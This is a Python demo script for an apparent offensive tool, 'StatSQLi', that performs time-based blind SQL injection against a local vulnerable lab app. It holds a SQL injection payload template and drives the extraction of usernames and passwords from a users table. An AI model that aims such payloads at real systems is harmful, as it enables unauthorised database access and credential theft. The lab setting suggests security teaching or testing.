#!/usr/bin/env python3
"""
Demo script for StatSQLi.
Shows the tool in action against the vulnerable lab application.
"""

import sys
import time
from pathlib import Path

# Add project to path
sys.path.insert(0, str(Path(__file__).parent))

from statsqli.main import StatSQLi


def print_banner():
    """Print welcome banner."""
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║         StatSQLi - Statistical SQL Injection Tool        ║
    ║                  Fast & Reliable Extraction              ║
    ╚═══════════════════════════════════════════════════════════╝
    
    This demo will extract data from a vulnerable web application
    using time-based blind SQL injection with statistical analysis.
    """)


def demo_extraction():
    """Run a demonstration extraction."""
    url = "http://127.0.0.1:5000/vulnerable?id=1"
    
    # For SQLite, we need a special payload since SLEEP() doesn't exist
    # The lab app simulates SLEEP() detection
    # Format: condition should be followed by AND SLEEP, like: (condition) AND SLEEP(2)
    payload_template = "1 OR ({condition}) AND SLEEP(2) -- -"
    
    print("[*] Initializing StatSQLi...")
    print(f"[*] Target: {url}")
    
    try:
        # Initialize tool with adaptive delay detection
        tool = StatSQLi(
            url=url,
            payload_template=payload_template,
            delay=None,  # Auto-detect
            parallel=True,
            max_workers=4
        )
        
        print("\n" + "="*60)
        print("DEMO 1: Extract username from first user")
        print("="*60)
        start_time = time.time()
        
        result = tool.extract_string_custom(
            table="users",
            column="username",
            where_clause="1=1",
            max_length=20
        )
        
        elapsed = time.time() - start_time
        
        print(f"\n[+] Extraction complete!")
        print(f"[+] Result: {result}")
        print(f"[+] Time taken: {elapsed:.2f} seconds")
        
        print("\n" + "="*60)
        print("DEMO 2: Extract password from first user")
        print("="*60)
        start_time = time.time()
        
        password = tool.extract_string_custom(
            table="users",
            column="password",
            where_clause="1=1",
            max_length=30
        )
        
        elapsed = time.time() - start_time
        
        print(f"\n[+] Extraction complete!")
        print(f"[+] Result: {password}")
        print(f"[+] Time taken: {elapsed:.2f} seconds")
        
        print("\n" + "="*60)
        print("SUMMARY")
        print("="*60)
        print(f"Username: {result}")
        print(f"Password: {password}")
        print("\n[*] StatSQLi successfully extracted data using:")
        print("    - Statistical timing analysis (Welch's t-test)")
        print("    - Binary search algorithm")
        print("    - Adaptive delay detection")
        print("    - Parallel extraction")
        
    except Exception as e:
        print(f"\n[!] Error during extraction: {e}")
        print("[!] Make sure the lab application is running:")
        print("    cd lab && python app.py")
        return False
    
    return True


def main():
    """Main demo function."""
    print_banner()
    
    print("[*] Make sure the vulnerable lab application is running!")
    print("[*] Start it with: cd lab && python app.py")
    print("[*] Then press Enter to continue...")
    input()
    
    print("\n[*] Starting demo extraction...\n")
    
    success = demo_extraction()
    
    if success:
        print("\n[+] Demo completed successfully!")
    else:
        print("\n[!] Demo failed. Check the error messages above.")
        sys.exit(1)


if __name__ == '__main__':
    main()

